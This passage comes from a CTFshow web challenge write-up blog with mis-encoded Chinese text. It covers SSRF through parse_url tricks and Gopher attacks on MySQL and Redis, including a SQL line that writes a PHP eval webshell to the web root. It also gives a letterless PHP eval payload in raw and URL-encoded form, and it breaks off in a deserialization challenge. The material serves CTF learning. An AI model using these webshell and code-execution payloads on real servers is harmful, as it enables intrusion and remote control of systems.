   <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¦æ±‚ä»¥<a href="http://ctf.å¼€å¤´ï¼Œä»¥showç»“å°¾ï¼š`url=http://ctf.@127.0.0.1/flag.php?show`" target="_blank" rel="noopener">http://ctf.å¼€å¤´ï¼Œä»¥showç»“å°¾ï¼š`url=http://ctf.@127.0.0.1/flag.php?show`</a></p><p><a href="https://www.cnblogs.com/tr1ple/p/11137159.html" target="_blank" rel="noopener">parse_urlå°ç»“</a></p><pre class="line-numbers language-php"><code class="language-php">                         <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token delimiter">&lt;?php</span><span class="token variable">$url</span> <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//username:password@hostname/path?arg=value#anchor';</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token constant">PHP_URL_PATH</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>ç»“æœ<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token keyword">Array</span><span class="token punctuation">(</span>    <span class="token punctuation">[</span>scheme<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> http    <span class="token punctuation">[</span>host<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> hostname            <span class="token comment" spellcheck="true">//</span>    <span class="token punctuation">[</span>user<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> username            @å‰    <span class="token punctuation">[</span>pass<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> password            @å‰    <span class="token punctuation">[</span>path<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">/</span>path                <span class="token operator">/</span>    <span class="token punctuation">[</span>query<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> arg<span class="token operator">=</span>value        <span class="token operator">?</span>ä»¥åçš„key<span class="token operator">=</span>value    <span class="token punctuation">[</span>fragment<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> anchor        <span class="token shell-comment comment">#ä»¥åçš„éƒ¨åˆ†</span><span class="token punctuation">)</span>    <span class="token operator">/</span>path<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$url</span> <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//ctf.@127.0.0.1/flag.php?show';</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//è¿è¡Œç»“æœ:</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">[</span><span class="token string">"scheme"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"http"</span>  <span class="token punctuation">[</span><span class="token string">"host"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string">"127.0.0.1"</span>  <span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"ctf."</span>  <span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string">"/flag.php"</span>  <span class="token punctuation">[</span><span class="token string">"query"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"show"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web359â€”â€”Gopheråè®®æ‰“æ— å¯†ç çš„mysql"><a href="#web359â€”â€”Gopheråè®®æ‰“æ— å¯†ç çš„mysql" class="headerlink" title="web359â€”â€”Gopheråè®®æ‰“æ— å¯†ç çš„mysql"></a>web359â€”â€”Gopheråè®®æ‰“æ— å¯†ç çš„mysql</h1><p>1.ä¸‹è½½<code>Gopherusï¼š</code></p><pre class="line-numbers language-php"><code class="language-php">git clone https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//github.com/tarunkant/Gopherus.git</span>python gopherus<span class="token punctuation">.</span>py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210908155114746.png" alt="image-20210908155114746"></p><p><code>select &#39;&lt;?php eval($_POST[1]);?&gt;&#39; into outfile &#39;/var/www/html/6.php&#39;</code></p><p>2.å°†å¾—åˆ°ç»è¿‡urlç¼–ç çš„å­—ç¬¦å†ç¼–ç ä¸€æ¬¡<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210908155938683.png" alt="image-20210908155938683"></p><p>3.æœ€ååœ¨check.phpé¡µé¢POSTä¼ å‚</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210908160203451.png" alt="image-20210908160203451"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210908160300221.png" alt="image-20210908160300221"></p><p>å»æ ¹ç›®å½•ä¸‹æœ‰flag.txt</p><h1 id="web360â€”â€”Gopheråè®®æ‰“redis"><a href="#web360â€”â€”Gopheråè®®æ‰“redis" class="headerlink" title="web360â€”â€”Gopheråè®®æ‰“redis"></a>web360â€”â€”Gopheråè®®æ‰“redis</h1><p>ç«¯å£ä¸º6379åŒæ ·æ“ä½œå°±å¯ä»¥äº†ğŸ˜Šï¼Œä½†æ˜¯æˆ‘æŠŠç¯å¢ƒå¹²åºŸäº†iğŸ™ƒ</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210908164829918.png" alt="image-20210908164829918"></p>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowåƒç“œæ¯(web)</title>
      <link href="/2021/08/25/ctfshow-chi-gua-bei-web/"/>
      <url>/2021/08/25/ctfshow-chi-gua-bei-web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="shellme"><a href="#shellme" class="headerlink" title="shellme"></a>shellme</h1><p>æœç´¢ctfshowå³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210825215841155.png" alt="image-20210825215841155"></p><h1 id="çƒ­èº«"><a href="#çƒ­èº«" class="headerlink" title="çƒ­èº«"></a>çƒ­èº«</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//å‚æ•°ç­‰äº4476ä¸è¡Œ</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[a-z]|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//åŒ¹é…åˆ°å°å†™å­—æ¯å’Œ.ä¸è¡Œ</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//å¿…é¡»æ²¡æœ‰0</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//numå¼ºç­‰äº4476</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆï¼Œç¬¬ä¸€ä¸ªæ¡ä»¶æ˜¯ç»è¿‡å¼±ç±»å‹å¤„ç†åçš„numä¸èƒ½ç­‰äº4476ï¼Œå†åŠ ä¸Šç¬¬äºŒé“åï¼Œå¤šä»¥å­—ç¬¦ä¸²4476æºæ‚å­—ç¬¦æ˜¯è¿‡ä¸äº†çš„ï¼Œstrposå‡½æ•°æ¼æ´ä¹Ÿè¢«banäº†ï¼Œä½†æ˜¯strposæ˜¯æœ‰ä¸‰ä¸ªå‚æ•°çš„ï¼Œå½“ç¬¬ä¸‰å‚æ•°é»˜è®¤æ—¶ï¼Œåˆ™é»˜è®¤ä¸ºä»ç¬¬0ä½å¼€å§‹æ‰¾</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'00123'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"ä¸æ˜¯ä»ç¬¬0ä½"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"ä»ç¬¬0ä½å¼€å§‹çš„"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥åˆ©ç”¨8è¿›åˆ¶é…åˆï¼‹å³å¯ç»•è¿‡</p><p><code>?num=+010574</code></p><h1 id="shellme-Revenge"><a href="#shellme-Revenge" class="headerlink" title="shellme_Revenge"></a>shellme_Revenge</h1><p><strong>f3é¡µé¢æŸ¥æ‰¾hintï¼š</strong></p><p><code>hint=%3Flooklook; ===&gt;hint=?looklook;</code></p><p>åœ¨cookieä¸­ä¹Ÿå­˜åœ¨hint</p><p><strong>ç„¶å?looklook=1å³å¯å¾—åˆ°é¢˜ç›®æºç ï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'looklook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"hint"</span><span class="token punctuation">,</span> <span class="token string">"?looklook"</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ctf_show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ctf_show'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">107</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[!@#%^&amp;*:'\"|`a-zA-BD-Z~\\\\]|[4-9]/"</span><span class="token punctuation">,</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"fucccc hacker!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€é“å‘½ä»¤æ‰§è¡Œé¢˜ç›®ï¼ï¼ï¼</p><p>æ‰€æœ‰å¯è§ç¬¦å·åŸºæœ¬å·²ç»è¿‡æ»¤äº†ï¼ï¼ï¼</p><p>å¯ç”¨çš„å­—ç¬¦æœ‰ï¼šå¤§å†™<code>C</code>ã€<code>0åˆ°3</code>ã€<code>[</code>ã€<code>]</code>ã€<code>$</code>ã€<code>_</code>ã€<code>(</code>ã€<code>)</code>ã€<code>;</code></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</a>åˆ©ç”¨çš„æ˜¯æ–¹æ³•ä¸‰ï¼š</p><p>åˆ©ç”¨çš„æ˜¯ï¼š</p><p>å¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²ï¼Œæ•°ç»„å°†è¢«è½¬æ¢æˆå­—ç¬¦ä¸²</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Array</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨ï¼š</p><ul><li>PHPè®¤ä¸ºç»“æœæ˜¯æ— é™å¤§æ—¶ï¼Œç»™å‡ºçš„ç»“æœæ˜¯ï¼šINFï¼ˆInfiniteï¼‰</li><li>å¦‚æœä¸€ä¸ªæ•°è¶…å‡º Infinite(æ— é™å¤§ï¼Œæ­£æ— ç©·)ï¼Œé‚£å°±æ˜¯:   NANï¼ˆnot-a-numberï¼‰</li></ul><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">var_dump</span><span class="token punctuation">(</span>C<span class="token operator">/</span>C<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//float(NAN)</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span>C<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//float(INF)</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å­—æ¯/å­—æ¯=0/0å°±ä¼šè¢«è®¤ä¸ºæ˜¯æ— æ³•è¢«æµ‹é‡ä¹Ÿå°±æ˜¯<strong>NaN</strong></p><p>1/å­—æ¯=1/0ä¼šè¢«è®¤ä¸ºæ— é™å¤§<strong>INF</strong></p><p>ä½†æ˜¯æƒ³è¦å¾—åˆ°å•ä¸ªå­—ç¬¦è¿˜éœ€è¦è¿æ¥ä¸€ä¸ªå­—ç¬¦ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> C<span class="token operator">/</span>C<span class="token punctuation">.</span>C<span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//N</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£æˆ‘ä»¬éœ€è¦çš„è¯­å¥æ˜¯ï¼š<code>$_GET[0]($_GET[1])</code></p><table><thead><tr><th align="left">ä¾‹å­</th><th align="left">åç§°</th><th align="left">æ•ˆæœ</th></tr></thead><tbody><tr><td align="left">++$a</td><td align="left">å‰åŠ </td><td align="left">$a çš„å€¼åŠ ä¸€ï¼Œç„¶åè¿”å› $aã€‚</td></tr><tr><td align="left">$a++</td><td align="left">ååŠ </td><td align="left">è¿”å› $aï¼Œç„¶åå°† $a çš„å€¼åŠ ä¸€ã€‚</td></tr><tr><td align="left">â€“$a</td><td align="left">å‰å‡</td><td align="left">$a çš„å€¼å‡ä¸€ï¼Œ ç„¶åè¿”å› $aã€‚</td></tr><tr><td align="left">$aâ€“</td><td align="left">åå‡</td><td align="left">è¿”å› $aï¼Œç„¶åå°† $a çš„å€¼å‡ä¸€ã€‚</td></tr></tbody></table><p><strong>è‡ªå¢å¼€å§‹ï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span>C<span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//D</span><span class="token variable">$C</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//E</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//F</span><span class="token variable">$C_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//G</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span>C<span class="token operator">/</span>C<span class="token punctuation">.</span>C<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//N</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//O</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//P</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Q</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//R</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//S</span><span class="token variable">$_</span><span class="token operator">=</span>_<span class="token punctuation">.</span><span class="token variable">$C_</span><span class="token punctuation">.</span><span class="token variable">$C</span><span class="token punctuation">.</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//_GET</span>$<span class="token variable">$_</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">(</span>$<span class="token variable">$_</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$_GET[1]($_GET[2])</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payload:</strong><code>ctf_show=$_=C;$_++;$C=++$_;$_++;$C_=++$_;$_=(C/C.C)[0];$_++;$_++;$_++;$_++;$_++;$_=_.$C_.$C.++$_;$$_[1]($$_[2]);</code></p><p><strong>urlç¼–ç ï¼š</strong><code>ctf_show=%24_%3DC%3B%24_%2B%2B%3B%24C%3D%2B%2B%24_%3B%24_%2B%2B%3B%24C_%3D%2B%2B%24_%3B%24_%3D(C%2FC.C)%5B0%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D_.%24C_.%24C.%2B%2B%24_%3B%24%24_%5B1%5D(%24%24_%5B2%5D)%3B</code></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210831200727472.png" alt="image-20210831200727472"></p><h1 id="ATTup"><a href="#ATTup" class="headerlink" title="ATTup"></a>ATTup</h1><p><a href="https://www.cnblogs.com/bmjoker/p/13742666.html" target="_blank" rel="noopener">phpååºåˆ—åŒ–ä»å…¥é—¨åˆ°æ”¾å¼ƒ(å…¥é—¨ç¯‡)</a></p><p>æŠ“åŒ…å»ä¸Šä¸€çº§ç›®å½•æŸ¥æ‰¾æºç ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210906182131450.png" alt="image-20210906182131450"></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">View</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$fn</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('"</span><span class="token punctuation">.</span><span class="token variable">$text</span><span class="token punctuation">.</span><span class="token string">"');self.location=document.referrer;&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Fun</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$fun</span> <span class="token operator">=</span> <span class="token string">":)"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ï¼ŒæŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ï¼Œè¿”å›å€¼éœ€è¦ä¸ºå­—ç¬¦ä¸²ï¼Œä¾‹å¦‚echoæ‰“å°å‡ºå¯¹è±¡å°±ä¼šè°ƒç”¨æ­¤æ–¹æ³•</span>        <span class="token variable">$fuc</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fun</span><span class="token punctuation">;</span>        <span class="token variable">$fuc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&lt;script>alert('Be a happy string~');self.location=document.referrer;&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//ææ„å‡½æ•°ï¼Œå’Œæ„é€ 